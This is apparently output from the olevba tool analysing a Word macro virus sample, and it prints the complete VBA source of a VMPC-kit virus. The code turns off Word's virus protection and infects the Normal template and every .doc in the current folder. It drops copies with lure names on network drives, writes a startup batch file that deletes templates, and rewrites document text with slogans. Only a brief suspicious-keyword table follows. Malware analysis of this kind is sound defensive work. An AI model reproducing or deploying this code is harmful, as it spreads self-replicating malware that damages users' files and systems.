olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-d6883c1a7c1731c9b5ec9e860425909490e10662
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-d6883c1a7c1731c9b5ec9e860425909490e10662 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO iramagherafelt.bas 
in file: Virus.MSWord.VMPC-based-d6883c1a7c1731c9b5ec9e860425909490e10662 - OLE stream: 'Macros/VBA/iramagherafelt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub iramagherafelt()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Live for Now"
    'Poppy ID : 749464391055
    
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
f3478 = u6579 & c6174 & Int(Rnd * 1279)
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
k10972 = m17908 & e5403
f13490 = u11923 & c5246 & Int(Rnd * 4268)
ActiveDocument.ReadOnlyRecommended = False
f9085 = u17480 & c19047 & k14010 & m17480
f13251 = u5192 & c12776 & k9320 & m5192
f7074 = u3152 & c11872 & Int(Rnd * 7788)
k11135 = m9611 & e15689
w643974944 = 0
k12224 = m9217 & e11067
k15442 = m16184 & e10676
Set er7494643910 = MacroContainer
f16323 = u19464 & c11991 & Int(Rnd * 7295)
f9097 = u12825 & c8119 & k10848 & m12825
k5566 = m11268 & e9711
 f1531$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f1932 = u10366 & c14864 & Int(Rnd * 5717)
k1967494 = GetAttr(NormalTemplate.FullName)
If k1967494 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1531$)
k15537 = m15112 & e13783
If k1967494 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f1531$)
f5097 = u2318 & c17171 & Int(Rnd * 7255)
If k1967494 = vbReadOnly Then GoTo fuckoff
f10943 = u9950 & c12514 & Int(Rnd * 5451)
If k1967494 = vbReadOnly + vbArchive Then GoTo fuckoff
f10478 = u11832 & c16647 & Int(Rnd * 4783)
f3883 = u10513 & c1424 & k792 & m10513
If er7494643910 = NormalTemplate Then w643974944 = 1
k4068 = m9792 & e5977
If w643974944 = 1 Then ll0643911 = NormalTemplate.FullName Else ll0643911 = ActiveDocument.FullName
f9834 = u11167 & c8930 & Int(Rnd * 3750)
If w643974944 = 1 Then ki749412 = ActiveDocument.FullName Else ki749412 = NormalTemplate.FullName
Application.OrganizerCopy Source:=ll0643911, Destination:=ki749412, Name:="iramagherafelt", Object:=wdOrganizerObjectProjectItems
If w643974944 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f10717 = u8563 & c9117 & k16598 & m8563
If w643974944 = 0 Then
k13666 = m8383 & e12948
     If NormalTemplate.Saved = False Then NormalTemplate.Save
k17228 = m4448 & e13731
     End If
f6716 = u18055 & c8169 & Int(Rnd * 3232)
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "IRA-Magherafelt", vbInformation
End Sub
Sub FileClose()
    On Error Resume Next
f14359 = u13974 & c16360 & Int(Rnd * 9506)
k11507 = m14864 & e12791
    Call iramagherafelt
    If ActiveDocument.Saved = False Then ActiveDocument.Save
f14466 = u6996 & c8525 & Int(Rnd * 1546)
    ActiveDocument.Close
k3723 = m10693 & e14801
End Sub
Sub FileExit()
    On Error Resume Next
k9788 = m9374 & e6916
k9759 = m13218 & e10990
    Call iramagherafelt
f12335 = u4302 & c10114 & k12347 & m4302
    If ActiveDocument.Saved = False Then ActiveDocument.Save
k5415 = m10029 & e14749
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call iramagherafelt
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call iramagherafelt
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
k15194 = m16014 & e2610
End Sub
Sub ToolsMacro()
    On Error Resume Next
f2264 = u14774 & c10426 & k5042 & m14774
f17942 = u15203 & c12988 & Int(Rnd * 9141)
    Call iramagherafelt
    Call p196
f4122 = u7244 & c13892 & Int(Rnd * 9977)
f13716 = u13309 & c8643 & Int(Rnd * 8474)
k9445 = m10277 & e15741
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call iramagherafelt
    Call p196
k15384 = m3873 & e8822
k13694 = m14538 & e8875
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call iramagherafelt
f13955 = u10040 & c1112 & k8098 & m10040
    Call p196
k8728 = m15924 & e7466
End Sub
Sub p196()
    On Error Resume Next
k17944 = m8799 & e12008
k8785 = m8236 & e9318
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "i"
            .Replacement.Text = "Free Northern Ireland!"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f11347 = u13884 & c7764 & k8069 & m13884
f8693 = u18889 & c12870 & Int(Rnd * 3765)
n$ = NormalTemplate
f9323 = u4212 & c11517 & Int(Rnd * 9474)
Part11$ = "attrib -h -r "
k12195 = m3062 & e5142
k14038 = m3637 & e10050
snag$ = "c:\progra~1\micros~1\templa~1\"
f11466 = u12250 & c18998 & Int(Rnd * 1759)
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
k5223 = m2171 & e8535
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
k16445 = m7323 & e8274
f10644 = u9036 & c9428 & k9292 & m9036
k7258 = m10604 & e9658
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

